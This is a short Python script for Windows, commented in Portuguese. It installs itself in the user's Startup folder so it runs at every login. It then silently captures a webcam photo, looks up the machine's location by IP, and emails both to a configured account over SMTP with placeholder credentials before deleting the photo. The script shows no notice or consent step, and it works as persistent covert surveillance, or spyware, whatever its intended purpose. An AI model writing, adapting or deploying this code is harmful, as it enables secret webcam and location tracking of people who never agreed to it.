from win32com.client import Dispatch
import os
import cv2
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from datetime import datetime
import geocoder
import socket
import time

# Cria Inicializador
def CriaInicializador():
    pathStartup = os.getenv('APPDATA') + "\Microsoft\Windows\Start Menu\Programs\Startup"
    print(pathStartup)
    filename = os.path.basename(__file__)[:os.path.basename(__file__).find(".")] + ".lnk"
    pathShortcut = os.path.join(pathStartup, filename)
    target = os.getcwd() + '\\' + os.path.basename(__file__)[:os.path.basename(__file__).find(".")] + ".exe"
    print(target)
    targetinv = target[::-1]
    wDirinv = targetinv[targetinv.find("\\") + 1:]
    wDir = wDirinv[::-1]
    icon = target
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(pathShortcut)
    shortcut.Targetpath = target
    shortcut.WorkingDirectory = wDir
    shortcut.IconLocation = icon
    shortcut.save()

# Salva foto atual da webcam
def FotoAtualdaWebcam():
    cam = cv2.VideoCapture(0)
    result, image = cam.read()
    if result:
        cv2.imwrite("webcam.png", image)
    else:
        print("Imagem não detectada")

def RetornaDatahoraeLocalAtual():
    now = datetime.now()
    g = geocoder.ip('me')
    return (now.strftime("%d/%m/%Y %H:%M:%S") + " - Localização Atual: " + str(g.latlng))

def EnviaEmailComImage(ImgFileName = "webcam.png"):
    with open(ImgFileName, 'rb') as f:
        img_data = f.read()

    msg = MIMEMultipart()
    msg['Subject'] = 'Nome da Mensagem'
    msg['From'] = 'Email do Remetente'
    msg['To'] = 'Email do Destinatário"'

    text = MIMEText(RetornaDatahoraeLocalAtual())
    msg.attach(text)
    image = MIMEImage(img_data, name=os.path.basename(ImgFileName))
    msg.attach(image)

    s = smtplib.SMTP("Server Address do email", "Port Number do email")
    s.ehlo()
    s.starttls()
    s.ehlo()
    s.login("Email da conta que vai enviar", "Senha da Conta")
    s.sendmail("Email do Remetente", "Email do Destinatário", msg.as_string())
    s.quit()

def Apagafotowebcam():
    os.remove("webcam.png")

def ChecaConexaoNet():
    try:
        sock = socket.create_connection(("www.google.com", 80))
        if sock is not None:
            print('Clossing socket')
            sock.close
        return True
    except OSError:
        pass
    return False

while not(ChecaConexaoNet()):
    time.sleep(1)
CriaInicializador()
FotoAtualdaWebcam()
EnviaEmailComImage()
Apagafotowebcam()